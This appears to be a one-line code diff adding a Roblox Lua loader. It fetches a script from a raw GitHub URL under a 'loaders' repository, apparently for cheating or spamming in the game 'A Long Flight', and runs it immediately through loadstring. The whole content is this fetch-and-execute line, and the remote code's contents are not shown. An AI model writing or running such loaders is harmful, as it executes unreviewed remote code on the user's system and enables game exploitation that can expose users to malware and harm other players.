@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/a-long-flight-sandbox-spam3-mhcdwb9iodcgm5.lua"))()
